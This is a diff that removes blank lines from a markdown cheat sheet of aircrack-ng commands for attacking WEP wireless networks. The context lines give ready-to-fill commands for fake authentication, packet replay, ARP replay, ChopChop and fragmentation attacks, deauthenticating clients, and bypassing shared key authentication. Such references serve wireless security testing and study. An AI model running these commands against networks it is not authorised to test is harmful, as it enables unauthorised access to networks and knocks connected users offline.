@@ -34,7 +34,6 @@ CODE	   ATTACK NAME
    aireplay-ng -1 <reassociation timing in seconds> -e <ESSID> -a <AP_MAC> -h <mac> <interface>     
    #aireplay -1 0 -e testAP -a 13:06:19:94:00:00 -h 02:00:00:00:00:00 wlan0           
    
-   
 ## Interactive Packet Replay Attack
 
    airmon-ng start <interface> <AP_Channel>                                        
@@ -42,20 +41,16 @@ CODE	   ATTACK NAME
    aireplay-ng -1 0 -e <ESSID> -a <AP_MAC> -h <Your_MAC> <interface>                
    aireplay-ng -2 -b <AP_MAC> -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 <interface>      # interactive packet replay attack
                                    
-   
-
 ## ARP Request Replay Attack
                                         
    airodump-ng -c <AP_Channel> -w <captured_file> <interface>      
    aireplay-ng -3 -b <AP_MAC> -h <Your_MAC> <interface>                            
    aireplay-ng -0 1 -a <AP_MAC> -c <Client_MAC> <interface>                                                                              
  
-
 ## Korek ChopChop Attack
 
    airodump-ng -c <AP_Channel> --bssid <AP_MAC> -w <captured_file> <interface>       
    aireplay-ng -4 -b <AP_MAC> -h <Your_MAC> <interface>                                                              
-
 
 ## Fragmentation Attack
 
@@ -63,10 +58,8 @@ CODE	   ATTACK NAME
    aireplay-ng -5 -b <AP_MAC> -h <Your MAC> <interface>                             
    tcpdump -n -vvv -e -s0 -r <output_file>                                         
    aireplay-ng -2 -r <output_file> <interface>                                     
-
    
 ## Bypassing WEP Shared Key Authentication
-   
    
    airodump-ng -c <AP_Channel> --bssid <AP_MAC> -w <capture_file> <interface>                
    aireplay-ng -0 1 -a <AP_MAC> -c <Client_MAC> <interface>                                  
